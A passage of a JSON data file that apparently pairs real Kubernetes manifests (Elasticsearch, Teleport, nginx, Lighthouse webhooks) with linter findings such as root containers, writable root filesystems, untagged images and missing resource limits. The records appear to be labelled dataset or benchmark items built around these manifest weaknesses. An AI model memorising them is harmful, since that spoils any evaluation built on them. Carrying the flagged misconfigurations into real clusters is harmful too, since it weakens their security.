    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: elasticsearch\n    role: master\n  name: elasticsearch-master\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: elasticsearch\n      role: master\n  template:\n    metadata:\n      labels:\n        app: elasticsearch\n        role: master\n    spec:\n      containers:\n      - name: elasticsearch-master\n        image: elasticsearch\n        ports:\n        - containerPort: 9200\n          protocol: TCP\n        - containerPort: 9300\n          protocol: TCP\n        volumeMounts:\n        - name: data\n          mountPath: /usr/share/elasticsearch/data\n        env:\n        - name: cluster.name\n          value: elasticsearch-cluster\n        - name: discovery.zen.ping.unicast.hosts\n          value: elasticsearch-discovery\n        - name: discovery.zen.minimum_master_nodes\n          value: '1'\n        - name: discovery.zen.ping_timeout\n          value: 5s\n        - name: node.master\n          value: 'true'\n        - name: node.data\n          value: 'false'\n        - name: node.ingest\n          value: 'false'\n        - name: ES_JAVA_OPTS\n          value: -Xms256m -Xmx256m\n      initContainers:\n      - name: increase-vm-max-map\n        image: busybox\n        command:\n        - sysctl\n        - -w\n        - vm.max_map_count=262144\n        securityContext:\n          privileged: true\n      volumes:\n      - emptyDir: {}\n        name: data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"increase-vm-max-map\" has memory limit 0"
  },
  {
    "id": "10756",
    "manifest_path": "data/manifests/the_stack_sample/sample_4135.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  annotations:\n    argocd.argoproj.io/sync-wave: '1'\n  labels:\n    app.kubernetes.io/component: node\n    app.kubernetes.io/name: teleport\n  name: node-network\n  namespace: teleport\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: node\n      app.kubernetes.io/name: teleport\n      teleport-node: network\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3020'\n      labels:\n        app.kubernetes.io/component: node\n        app.kubernetes.io/name: teleport\n        teleport-node: network\n    spec:\n      containers:\n      - args:\n        - --roles=node\n        - --labels=team=network\n        - --diag-addr=0.0.0.0:3020\n        image: quay.io/cybozu/teleport-node\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3020\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        name: node-network\n        ports:\n        - containerPort: 3020\n          name: metrics\n        resources:\n          requests:\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/teleport\n          name: teleport-node-secret\n          readOnly: true\n        - mountPath: /var/lib/teleport\n          name: teleport-storage\n        - mountPath: /opt/neco-operation-cli/bin\n          name: neco-operation-cli\n          readOnly: true\n        - mountPath: /home/cybozu\n          name: home-dir\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 10000\n      serviceAccountName: node-network\n      volumes:\n      - name: teleport-node-secret\n        secret:\n          secretName: teleport-node-secret-20211130\n      - emptyDir: {}\n        name: teleport-storage\n      - hostPath:\n          path: /opt/neco-operation-cli/bin\n        name: neco-operation-cli\n      - ephemeral:\n          volumeClaimTemplate:\n            spec:\n              accessModes:\n              - ReadWriteOnce\n              resources:\n                requests:\n                  storage: 10Gi\n              storageClassName: topolvm-provisioner\n        name: home-dir\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"node-network\" is using an invalid container image, \"quay.io/cybozu/teleport-node\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10757",
    "manifest_path": "data/manifests/the_stack_sample/sample_4135.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  annotations:\n    argocd.argoproj.io/sync-wave: '1'\n  labels:\n    app.kubernetes.io/component: node\n    app.kubernetes.io/name: teleport\n  name: node-network\n  namespace: teleport\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: node\n      app.kubernetes.io/name: teleport\n      teleport-node: network\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3020'\n      labels:\n        app.kubernetes.io/component: node\n        app.kubernetes.io/name: teleport\n        teleport-node: network\n    spec:\n      containers:\n      - args:\n        - --roles=node\n        - --labels=team=network\n        - --diag-addr=0.0.0.0:3020\n        image: quay.io/cybozu/teleport-node\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3020\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        name: node-network\n        ports:\n        - containerPort: 3020\n          name: metrics\n        resources:\n          requests:\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/teleport\n          name: teleport-node-secret\n          readOnly: true\n        - mountPath: /var/lib/teleport\n          name: teleport-storage\n        - mountPath: /opt/neco-operation-cli/bin\n          name: neco-operation-cli\n          readOnly: true\n        - mountPath: /home/cybozu\n          name: home-dir\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 10000\n      serviceAccountName: node-network\n      volumes:\n      - name: teleport-node-secret\n        secret:\n          secretName: teleport-node-secret-20211130\n      - emptyDir: {}\n        name: teleport-storage\n      - hostPath:\n          path: /opt/neco-operation-cli/bin\n        name: neco-operation-cli\n      - ephemeral:\n          volumeClaimTemplate:\n            spec:\n              accessModes:\n              - ReadWriteOnce\n              resources:\n                requests:\n                  storage: 10Gi\n              storageClassName: topolvm-provisioner\n        name: home-dir\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-network\" does not have a read-only root file system"
  },
  {
    "id": "10758",
    "manifest_path": "data/manifests/the_stack_sample/sample_4135.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  annotations:\n    argocd.argoproj.io/sync-wave: '1'\n  labels:\n    app.kubernetes.io/component: node\n    app.kubernetes.io/name: teleport\n  name: node-network\n  namespace: teleport\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: node\n      app.kubernetes.io/name: teleport\n      teleport-node: network\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3020'\n      labels:\n        app.kubernetes.io/component: node\n        app.kubernetes.io/name: teleport\n        teleport-node: network\n    spec:\n      containers:\n      - args:\n        - --roles=node\n        - --labels=team=network\n        - --diag-addr=0.0.0.0:3020\n        image: quay.io/cybozu/teleport-node\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3020\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        name: node-network\n        ports:\n        - containerPort: 3020\n          name: metrics\n        resources:\n          requests:\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/teleport\n          name: teleport-node-secret\n          readOnly: true\n        - mountPath: /var/lib/teleport\n          name: teleport-storage\n        - mountPath: /opt/neco-operation-cli/bin\n          name: neco-operation-cli\n          readOnly: true\n        - mountPath: /home/cybozu\n          name: home-dir\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 10000\n      serviceAccountName: node-network\n      volumes:\n      - name: teleport-node-secret\n        secret:\n          secretName: teleport-node-secret-20211130\n      - emptyDir: {}\n        name: teleport-storage\n      - hostPath:\n          path: /opt/neco-operation-cli/bin\n        name: neco-operation-cli\n      - ephemeral:\n          volumeClaimTemplate:\n            spec:\n              accessModes:\n              - ReadWriteOnce\n              resources:\n                requests:\n                  storage: 10Gi\n              storageClassName: topolvm-provisioner\n        name: home-dir\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"node-network\" not found"
  },
  {
    "id": "10759",
    "manifest_path": "data/manifests/the_stack_sample/sample_4135.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  annotations:\n    argocd.argoproj.io/sync-wave: '1'\n  labels:\n    app.kubernetes.io/component: node\n    app.kubernetes.io/name: teleport\n  name: node-network\n  namespace: teleport\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: node\n      app.kubernetes.io/name: teleport\n      teleport-node: network\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3020'\n      labels:\n        app.kubernetes.io/component: node\n        app.kubernetes.io/name: teleport\n        teleport-node: network\n    spec:\n      containers:\n      - args:\n        - --roles=node\n        - --labels=team=network\n        - --diag-addr=0.0.0.0:3020\n        image: quay.io/cybozu/teleport-node\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3020\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        name: node-network\n        ports:\n        - containerPort: 3020\n          name: metrics\n        resources:\n          requests:\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/teleport\n          name: teleport-node-secret\n          readOnly: true\n        - mountPath: /var/lib/teleport\n          name: teleport-storage\n        - mountPath: /opt/neco-operation-cli/bin\n          name: neco-operation-cli\n          readOnly: true\n        - mountPath: /home/cybozu\n          name: home-dir\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 10000\n      serviceAccountName: node-network\n      volumes:\n      - name: teleport-node-secret\n        secret:\n          secretName: teleport-node-secret-20211130\n      - emptyDir: {}\n        name: teleport-storage\n      - hostPath:\n          path: /opt/neco-operation-cli/bin\n        name: neco-operation-cli\n      - ephemeral:\n          volumeClaimTemplate:\n            spec:\n              accessModes:\n              - ReadWriteOnce\n              resources:\n                requests:\n                  storage: 10Gi\n              storageClassName: topolvm-provisioner\n        name: home-dir\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"node-network\" has cpu request 0"
  },
  {
    "id": "10760",
    "manifest_path": "data/manifests/the_stack_sample/sample_4135.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  annotations:\n    argocd.argoproj.io/sync-wave: '1'\n  labels:\n    app.kubernetes.io/component: node\n    app.kubernetes.io/name: teleport\n  name: node-network\n  namespace: teleport\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: node\n      app.kubernetes.io/name: teleport\n      teleport-node: network\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3020'\n      labels:\n        app.kubernetes.io/component: node\n        app.kubernetes.io/name: teleport\n        teleport-node: network\n    spec:\n      containers:\n      - args:\n        - --roles=node\n        - --labels=team=network\n        - --diag-addr=0.0.0.0:3020\n        image: quay.io/cybozu/teleport-node\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3020\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        name: node-network\n        ports:\n        - containerPort: 3020\n          name: metrics\n        resources:\n          requests:\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /etc/teleport\n          name: teleport-node-secret\n          readOnly: true\n        - mountPath: /var/lib/teleport\n          name: teleport-storage\n        - mountPath: /opt/neco-operation-cli/bin\n          name: neco-operation-cli\n          readOnly: true\n        - mountPath: /home/cybozu\n          name: home-dir\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 10000\n      serviceAccountName: node-network\n      volumes:\n      - name: teleport-node-secret\n        secret:\n          secretName: teleport-node-secret-20211130\n      - emptyDir: {}\n        name: teleport-storage\n      - hostPath:\n          path: /opt/neco-operation-cli/bin\n        name: neco-operation-cli\n      - ephemeral:\n          volumeClaimTemplate:\n            spec:\n              accessModes:\n              - ReadWriteOnce\n              resources:\n                requests:\n                  storage: 10Gi\n              storageClassName: topolvm-provisioner\n        name: home-dir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"node-network\" has memory limit 0"
  },
  {
    "id": "10761",
    "manifest_path": "data/manifests/the_stack_sample/sample_4137.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: nginx\n  name: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: worldoflinux/nginx\n        imagePullPolicy: IfNotPresent\n        name: nginx\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n        resources: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"worldoflinux/nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10762",
    "manifest_path": "data/manifests/the_stack_sample/sample_4137.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: nginx\n  name: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: worldoflinux/nginx\n        imagePullPolicy: IfNotPresent\n        name: nginx\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n        resources: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10763",
    "manifest_path": "data/manifests/the_stack_sample/sample_4137.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: nginx\n  name: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: worldoflinux/nginx\n        imagePullPolicy: IfNotPresent\n        name: nginx\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n        resources: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10764",
    "manifest_path": "data/manifests/the_stack_sample/sample_4137.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: nginx\n  name: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: worldoflinux/nginx\n        imagePullPolicy: IfNotPresent\n        name: nginx\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n        resources: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10765",
    "manifest_path": "data/manifests/the_stack_sample/sample_4137.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: nginx\n  name: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - image: worldoflinux/nginx\n        imagePullPolicy: IfNotPresent\n        name: nginx\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n        resources: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10766",
    "manifest_path": "data/manifests/the_stack_sample/sample_4138.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: baldur-rs\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: baldur-tensplit\n  template:\n    metadata:\n      labels:\n        app: baldur-tensplit\n    spec:\n      containers:\n      - name: baldur-container\n        image: 952478859445.dkr.ecr.us-east-1.amazonaws.com/mkt-devops/mkt-tenant-splitter:baldur\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"baldur-container\" does not have a read-only root file system"
  },
  {
    "id": "10767",
    "manifest_path": "data/manifests/the_stack_sample/sample_4138.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: baldur-rs\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: baldur-tensplit\n  template:\n    metadata:\n      labels:\n        app: baldur-tensplit\n    spec:\n      containers:\n      - name: baldur-container\n        image: 952478859445.dkr.ecr.us-east-1.amazonaws.com/mkt-devops/mkt-tenant-splitter:baldur\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"baldur-container\" is not set to runAsNonRoot"
  },
  {
    "id": "10768",
    "manifest_path": "data/manifests/the_stack_sample/sample_4138.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: baldur-rs\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: baldur-tensplit\n  template:\n    metadata:\n      labels:\n        app: baldur-tensplit\n    spec:\n      containers:\n      - name: baldur-container\n        image: 952478859445.dkr.ecr.us-east-1.amazonaws.com/mkt-devops/mkt-tenant-splitter:baldur\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"baldur-container\" has cpu request 0"
  },
  {
    "id": "10769",
    "manifest_path": "data/manifests/the_stack_sample/sample_4138.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: baldur-rs\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: baldur-tensplit\n  template:\n    metadata:\n      labels:\n        app: baldur-tensplit\n    spec:\n      containers:\n      - name: baldur-container\n        image: 952478859445.dkr.ecr.us-east-1.amazonaws.com/mkt-devops/mkt-tenant-splitter:baldur\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"baldur-container\" has memory limit 0"
  },
  {
    "id": "10770",
    "manifest_path": "data/manifests/the_stack_sample/sample_4140.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webhooks\n  labels:\n    chart: lighthouse-1.1.52\n    app: lighthouse-webhooks\n    git.jenkins-x.io/sha: annotate\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    checksum/config: dfd96794136281a1e46df3e8498ea7a204f39db25705522933a66fc8af2f2d61\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-webhooks\n  template:\n    metadata:\n      labels:\n        app: lighthouse-webhooks\n      annotations:\n        prometheus.io/port: '2112'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: 2ba6dab6c7cebc4d23758a9ff815c793221476a56dbb5d419265cf417d4d2369\n    spec:\n      serviceAccountName: lighthouse-webhooks\n      containers:\n      - name: lighthouse-webhooks\n        image: ghcr.io/jenkins-x/lighthouse-webhooks:1.1.52\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: LH_CUSTOM_TRIGGER_COMMAND\n          value: jx\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: gongli-nanjing\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.52\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 3ada070d91b11e719c7a25b247496070b0555df8\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 512Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-webhooks\" does not have a read-only root file system"
  },
  {
    "id": "10771",
    "manifest_path": "data/manifests/the_stack_sample/sample_4140.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webhooks\n  labels:\n    chart: lighthouse-1.1.52\n    app: lighthouse-webhooks\n    git.jenkins-x.io/sha: annotate\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    checksum/config: dfd96794136281a1e46df3e8498ea7a204f39db25705522933a66fc8af2f2d61\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-webhooks\n  template:\n    metadata:\n      labels:\n        app: lighthouse-webhooks\n      annotations:\n        prometheus.io/port: '2112'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: 2ba6dab6c7cebc4d23758a9ff815c793221476a56dbb5d419265cf417d4d2369\n    spec:\n      serviceAccountName: lighthouse-webhooks\n      containers:\n      - name: lighthouse-webhooks\n        image: ghcr.io/jenkins-x/lighthouse-webhooks:1.1.52\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: LH_CUSTOM_TRIGGER_COMMAND\n          value: jx\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: gongli-nanjing\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.52\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 3ada070d91b11e719c7a25b247496070b0555df8\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 512Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-webhooks\" not found"
  },
  {
    "id": "10772",
    "manifest_path": "data/manifests/the_stack_sample/sample_4140.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-webhooks\n  labels:\n    chart: lighthouse-1.1.52\n    app: lighthouse-webhooks\n    git.jenkins-x.io/sha: annotate\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    checksum/config: dfd96794136281a1e46df3e8498ea7a204f39db25705522933a66fc8af2f2d61\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-webhooks\n  template:\n    metadata:\n      labels:\n        app: lighthouse-webhooks\n      annotations:\n        prometheus.io/port: '2112'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: 2ba6dab6c7cebc4d23758a9ff815c793221476a56dbb5d419265cf417d4d2369\n    spec:\n      serviceAccountName: lighthouse-webhooks\n      containers:\n      - name: lighthouse-webhooks\n        image: ghcr.io/jenkins-x/lighthouse-webhooks:1.1.52\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: LH_CUSTOM_TRIGGER_COMMAND\n          value: jx\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: gongli-nanjing\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.52\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 3ada070d91b11e719c7a25b247496070b0555df8\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        ports:\n        - containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          initialDelaySeconds: 60\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 512Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-webhooks\" is not set to runAsNonRoot"
  },
  {
    "id": "10773",
    "manifest_path": "data/manifests/the_stack_sample/sample_4141.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: player-csv\n  namespace: baseball\n  labels:\n    app: player-csv\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: player-csv\n  template:\n    metadata:\n      labels:\n        app: player-csv\n    spec:\n      containers:\n      - name: player-csv\n        image: nschultz/fantasy-baseball-player-csv:0.6.0\n        volumeMounts:\n        - name: player-csv-data-volume\n          mountPath: /app/data\n        ports:\n        - name: web\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /api/health\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 5\n      volumes:\n      - name: player-csv-data-volume\n        persistentVolumeClaim:\n          claimName: player-csv-data-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"player-csv\" does not have a read-only root file system"
  },
  {
    "id": "10774",
    "manifest_path": "data/manifests/the_stack_sample/sample_4141.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: player-csv\n  namespace: baseball\n  labels:\n    app: player-csv\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: player-csv\n  template:\n    metadata:\n      labels:\n        app: player-csv\n    spec:\n      containers:\n      - name: player-csv\n        image: nschultz/fantasy-baseball-player-csv:0.6.0\n        volumeMounts:\n        - name: player-csv-data-volume\n          mountPath: /app/data\n        ports:\n        - name: web\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /api/health\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 5\n      volumes:\n      - name: player-csv-data-volume\n        persistentVolumeClaim:\n          claimName: player-csv-data-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"player-csv\" is not set to runAsNonRoot"
  },
  {
    "id": "10775",
    "manifest_path": "data/manifests/the_stack_sample/sample_4141.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: player-csv\n  namespace: baseball\n  labels:\n    app: player-csv\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: player-csv\n  template:\n    metadata:\n      labels:\n        app: player-csv\n    spec:\n      containers:\n      - name: player-csv\n        image: nschultz/fantasy-baseball-player-csv:0.6.0\n        volumeMounts:\n        - name: player-csv-data-volume\n          mountPath: /app/data\n        ports:\n        - name: web\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /api/health\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 5\n      volumes:\n      - name: player-csv-data-volume\n        persistentVolumeClaim:\n          claimName: player-csv-data-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"player-csv\" has cpu request 0"
  },
  {
    "id": "10776",
    "manifest_path": "data/manifests/the_stack_sample/sample_4141.yaml",
